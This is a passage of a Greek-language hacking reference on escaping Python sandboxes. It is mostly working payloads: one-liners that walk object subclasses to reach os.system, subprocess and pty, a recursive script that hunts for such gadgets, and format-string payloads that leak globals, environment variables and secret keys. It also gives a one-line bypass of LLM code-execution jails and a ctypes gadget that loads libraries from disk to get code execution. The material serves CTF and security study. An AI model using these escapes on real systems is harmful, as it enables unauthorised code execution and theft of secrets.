Μπορούμε να κάνουμε το ίδιο πράγμα με **άλλες βιβλιοθήκες** που γνωρίζουμε ότι μπορούν να χρησιμοποιηθούν για **εκτέλεση εντολών**:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
Επιπλέον, θα μπορούσαμε ακόμη και να αναζητήσουμε ποια modules φορτώνουν κακόβουλες βιβλιοθήκες:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
Επιπλέον, αν πιστεύετε ότι **άλλες βιβλιοθήκες** μπορεί να είναι σε θέση να **καλούν συναρτήσεις για την εκτέλεση εντολών**, μπορούμε επίσης να **φιλτράρουμε με βάση τα ονόματα των συναρτήσεων** μέσα στις πιθανές βιβλιοθήκες:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Αναδρομική αναζήτηση των Builtins, Globals...

> [!WARNING]
> Αυτό είναι απλώς **φοβερό**. Αν **ψάχνετε για ένα object όπως τα globals, τα builtins, το open ή οτιδήποτε άλλο**, χρησιμοποιήστε αυτό το script για να **βρείτε αναδρομικά τα σημεία όπου μπορείτε να βρείτε αυτό το object.**
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Μπορείτε να ελέγξετε το output αυτού του script σε αυτήν τη σελίδα:


{{#ref}}
https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
{{#endref}}

## Python Format String

Αν **στείλετε** ένα **string** στην Python που πρόκειται να **μορφοποιηθεί**, μπορείτε να χρησιμοποιήσετε το `{}` για να αποκτήσετε πρόσβαση σε **εσωτερικές πληροφορίες της Python.** Για παράδειγμα, μπορείτε να χρησιμοποιήσετε τα προηγούμενα παραδείγματα για να αποκτήσετε πρόσβαση στα globals ή στα builtins.<sup>[[14]](#references)</sup>
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Σημειώστε ότι μπορείτε να **προσπελάσετε attributes** με τον κανονικό τρόπο, χρησιμοποιώντας **τελεία**, όπως στο `people_obj.__init__`, και **στοιχείο dict** με **παρενθέσεις**, χωρίς εισαγωγικά: `__globals__[CONFIG]`

Σημειώστε επίσης ότι μπορείτε να χρησιμοποιήσετε το `.__dict__` για να απαριθμήσετε τα στοιχεία ενός object: `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Μερικά άλλα ενδιαφέροντα χαρακτηριστικά των format strings είναι η δυνατότητα **εκτέλεσης** των **functions** **`str`**, **`repr`** και **`ascii`** στο υποδεικνυόμενο object, προσθέτοντας αντίστοιχα **`!s`**, **`!r`**, **`!a`**:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
Επιπλέον, είναι δυνατό να **γράψετε νέους formatters** σε classes:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Περισσότερα παραδείγματα** σχετικά με παραδείγματα **format** **string** μπορείτε να βρείτε στο [**https://pyformat.info/**](https://pyformat.info)

> [!CAUTION]
> Ελέγξτε επίσης την ακόλουθη σελίδα για gadgets που θα **διαβάζουν ευαίσθητες πληροφορίες από εσωτερικά αντικείμενα της Python**:


{{#ref}}
../python-internal-read-gadgets.md
{{#endref}}

### Payloads αποκάλυψης ευαίσθητων πληροφοριών
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}

# Example from https://corgi.rip/posts/buckeye-writeups/
secret_variable = "clueless"
x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
str(x) # Out: clueless
```
### Παράκαμψη LLM Jails

Από [εδώ](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`<sup>[[12]](#references)</sup>

### Από το format σε RCE με φόρτωση libraries

Σύμφωνα με το [**TypeMonkey chall από αυτό το writeup**](https://corgi.rip/posts/buckeye-writeups/) είναι δυνατή η φόρτωση arbitrary libraries από τον δίσκο, κάνοντας abuse του format string vulnerability στην Python.<sup>[[13]](#references)</sup>

Ως υπενθύμιση, κάθε φορά που εκτελείται μια ενέργεια στην Python, εκτελείται κάποια function. Για παράδειγμα, το `2*3` θα εκτελέσει το **`(2).mul(3)`** ή το `{'a':'b'}['a']` θα είναι **`{'a':'b'}.__getitem__('a')`**.

Υπάρχουν περισσότερα παρόμοια παραδείγματα στην ενότητα [**Python execution without calls**](#python-execution-without-calls).

Ένα python format string vuln δεν επιτρέπει την εκτέλεση function (δεν επιτρέπει τη χρήση παρενθέσεων), επομένως δεν είναι δυνατό να επιτευχθεί RCE όπως στο `'{0.system("/bin/sh")}'.format(os)`.\
Ωστόσο, είναι δυνατή η χρήση του `[]`. Επομένως, αν κάποια κοινή python library διαθέτει μέθοδο **`__getitem__`** ή **`__getattr__`** που εκτελεί arbitrary code, είναι δυνατό να γίνει abuse αυτών για την επίτευξη RCE.

Αναζητώντας ένα τέτοιο gadget στην Python, το writeup προτείνει αυτό το [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Εκεί βρήκε αυτό το [ένα](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
```python
class LibraryLoader(object):
def __init__(self, dlltype):
self._dlltype = dlltype

def __getattr__(self, name):
if name[0] == '_':
raise AttributeError(name)
try:
dll = self._dlltype(name)
except OSError:
raise AttributeError(name)
setattr(self, name, dll)
return dll

def __getitem__(self, name):
return getattr(self, name)

cdll = LibraryLoader(CDLL)
pydll = LibraryLoader(PyDLL)
```
Αυτό το gadget επιτρέπει τη **φόρτωση μιας βιβλιοθήκης από τον δίσκο**. Επομένως, είναι απαραίτητο να **εγγράψετε ή να ανεβάσετε τη βιβλιοθήκη προς φόρτωση**, σωστά μεταγλωττισμένη, στον server-στόχο.
```python
'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
```
Η πρόκληση στην πραγματικότητα εκμεταλλεύεται μια άλλη ευπάθεια στον server, η οποία επιτρέπει τη δημιουργία αυθαίρετων αρχείων στον δίσκο του server.

## Ανάλυση αντικειμένων Python

> [!TIP]
> Αν θέλετε να μάθετε σε βάθος για το **python bytecode**, διαβάστε αυτό το **εξαιρετικό** post σχετικά με το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)

Σε ορισμένα CTFs μπορεί να σας δοθεί το όνομα μιας **custom function όπου βρίσκεται το flag** και να χρειάζεται να δείτε τα **internals** της **function** για να το εξαγάγετε.

Αυτή είναι η function που πρέπει να επιθεωρήσετε:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` και `func_globals` (ίδια) Αποκτούν το global environment. Στο παράδειγμα μπορείτε να δείτε ορισμένα imported modules, κάποιες global variables και το περιεχόμενό τους που έχουν δηλωθεί:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Δείτε εδώ περισσότερα σημεία για να αποκτήσετε globals**](#globals-and-locals)

### **Πρόσβαση στον κώδικα της συνάρτησης**

**`__code__`** και `func_code`: Μπορείτε να **προσπελάσετε** αυτό το **attribute** της συνάρτησης για να **αποκτήσετε το code object** της συνάρτησης.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Λήψη πληροφοριών για τον κώδικα
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Αποσυναρμολόγηση μιας συνάρτησης**
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Παρατήρησε ότι **αν δεν μπορείς να κάνεις import το `dis` στο python sandbox**, μπορείς να λάβεις το **bytecode** της συνάρτησης (`get_flag.func_code.co_code`) και να το **disassemble** τοπικά. Δεν θα δεις το περιεχόμενο των μεταβλητών που φορτώνονται (`LOAD_CONST`), αλλά μπορείς να το υποθέσεις από το (`get_flag.func_code.co_consts`), επειδή το `LOAD_CONST`επίσης υποδεικνύει το offset της μεταβλητής που φορτώνεται.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
